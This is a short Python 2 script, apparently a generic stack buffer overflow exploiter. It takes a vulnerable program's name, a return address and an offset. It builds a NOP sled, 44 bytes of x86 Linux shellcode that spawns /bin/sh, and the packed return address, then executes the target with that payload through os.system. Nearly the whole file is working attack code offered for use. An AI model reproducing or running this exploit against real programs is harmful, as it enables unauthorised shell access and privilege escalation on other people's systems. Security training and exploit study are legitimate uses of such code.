import os , sys

print '\033[93m \n         ReZK2LL stack Buffer Overflow Exploiter        \n \033[0m'

if len(sys.argv) < 4:
	print "\033[91m [-] missing arguments \n \033[0m"
	print '\033[92m Usage : python %s vuln_app return_adress offset \n \033[0m' % sys.argv[0]
	print '\033[92m Exemple : python %s myApp 0xbffff754 150 \n \033[0m' % sys.argv[0]
	sys.exit(0)

if (not "0x" in sys.argv[2]) or len(sys.argv[2]) != 10:
	print "\033[91m [-] Bad return address \n\033[0m"
	sys.exit(0)
if int(sys.argv[3]) <= 0:
	print "\033[91m [-] Bad offset \n\033[0m"
	sys.exit(0)

if "/" in sys.argv[1]:
	prefix = ""
else:
	prefix = "./"

def getret(junk):
	notyet = junk[2:]

	return r"\x"+notyet[6:8]+r"\x"+notyet[4:6]+r"\x"+notyet[2:4]+r"\x"+notyet[0:2]

# shell code length 44
shellcode = "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x6e\x2f\x73\x68\x66\x68\x62\x69\x83\xec\x01\xc6\x04\x24\x2f\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
program = sys.argv[1]
ret = getret(sys.argv[2])
offset = sys.argv[3]
nopsled = (int(offset) - len(shellcode)) - 4

print "\033[96m [*] shellcode length : %s\033[0m" % len(shellcode)
print "\033[96m [*] using %s NOPs \033[0m" % nopsled
print "\033[96m [*] returning to %s \033[0m" % ret
print "\033[92m [*] exploiting ... \n\033[0m"

command = "%s%s `python -c'print \"\x90\" * %s + \"%s\" + \"%s\"'`" % (prefix , program , nopsled , shellcode , ret)
os.system(command)